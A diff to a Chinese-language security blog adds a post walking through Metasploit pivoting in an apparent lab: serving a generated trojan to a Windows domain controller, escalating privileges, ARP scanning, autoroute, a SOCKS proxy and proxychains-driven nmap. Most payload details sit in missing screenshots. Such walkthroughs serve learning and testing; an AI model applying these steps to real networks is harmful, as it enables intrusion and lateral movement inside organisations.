@@ -64,6 +64,80 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-pivoting" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2023/02/13/pivoting/" class="article-date">
+  <time datetime="2023-02-12T16:27:28.000Z" itemprop="datePublished">2023-02-13</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2023/02/13/pivoting/">pivoting跳板攻击和自动路由</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h3 id="pivoting跳板攻击和自动路由"><a href="#pivoting跳板攻击和自动路由" class="headerlink" title="pivoting跳板攻击和自动路由"></a>pivoting跳板攻击和自动路由</h3><ol>
+<li><p>使用msf生成木马<img src="/img/pivoting/image-20230212213822716.png" alt="image-20230212213822716"></p>
+</li>
+<li><p>使用python开启文件服务器  python2  -m SimpleHTTPServer 8080 <img src="/img/pivoting/image-20230212213846979.png" alt="image-20230212213846979"></p>
+</li>
+<li><p>在win2012-dc服务器上下载msf生成的木马<img src="/img/pivoting/image-20230212213732500.png" alt="image-20230212213732500"></p>
+</li>
+<li><p>上线<img src="/img/pivoting/image-20230212213953386.png" alt="image-20230212213953386"></p>
+</li>
+<li><p>进行提权<img src="/img/pivoting/image-20230212214119277.png" alt="image-20230212214119277"></p>
+</li>
+<li><p>连接上查看ipconfig  发现两个ip  认为是有域服务<img src="/img/pivoting/image-20230212214048968.png" alt="image-20230212214048968"></p>
+</li>
+<li><p>使用run post/windows/gather/arp_scanner RHOSTS=192.168.138.0/24扫描内网信息<img src="/img/pivoting/image-20230212214139675.png" alt="image-20230212214139675"></p>
+</li>
+<li><p> run post/multi/manage/autoroute 使用自动路由    run autoroute -p   <img src="/img/pivoting/image-20230212214212172.png" alt="image-20230212214212172"></p>
+</li>
+<li><p>放入后台backgroud</p>
+</li>
+<li><p>使用socket代理   use auxiliary/server/socks_proxy <img src="/img/pivoting/image-20230212214302073.png" alt="image-20230212214302073"></p>
+</li>
+<li><p>show options </p>
+</li>
+<li><p>设置为自己的10044端口接收socke协议，可以嫁接到自动路由上<img src="/img/pivoting/image-20230212214513204.png" alt="image-20230212214513204"></p>
+</li>
+<li><p>运行run</p>
+</li>
+<li><p>jobs发现运行了</p>
+</li>
+<li><p>nano /etc/proxychains4.conf    进入socket配置文件加入<img src="/img/pivoting/image-20230212214854307.png" alt="image-20230212214854307"></p>
+</li>
+<li><p>保存退出      nano：使用快捷Ctrl+X，然后会提示输入Y保存修改、输入N放弃修改。vi：首先需要按ESC键回到命令模式；然后输入:wq 保存文件并退出vi；最后回车即可。</p>
+</li>
+<li><p>怎么证明进入它的内网打开火狐  proxychains firefox    输入域中的网站<img src="/img/pivoting/image-20230213001954990.png" alt="image-20230213001954990"></p>
+</li>
+<li><p>使用nmap扫描常用端口     proxychains nmap -sT -Pn 192.168.138.130  开启了 445端口<img src="/img/pivoting/image-20230213002306588.png" alt="image-20230213002306588"></p>
+</li>
+</ol>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2023/02/13/pivoting/" data-id="cle1lqg280000oouz7pgq8p4z" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
     <article id="post-fuza-port-saomiao" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
     <a href="/2023/02/08/fuza-port-saomiao/" class="article-date">
@@ -555,6 +629,10 @@
       <ul>
         
           <li>
+            <a href="/2023/02/13/pivoting/">pivoting跳板攻击和自动路由</a>
+          </li>
+        
+          <li>
             <a href="/2023/02/08/fuza-port-saomiao/">端口扫描器（optparse模块OptionParser方法）</a>
           </li>
         
@@ -568,10 +646,6 @@
         
           <li>
             <a href="/2023/02/08/yuanchengkongzhi/">远程控制程序</a>
-          </li>
-        
-          <li>
-            <a href="/2023/02/04/processliaotianruanjian/">python进程池聊天软件</a>
           </li>
         
       </ul>
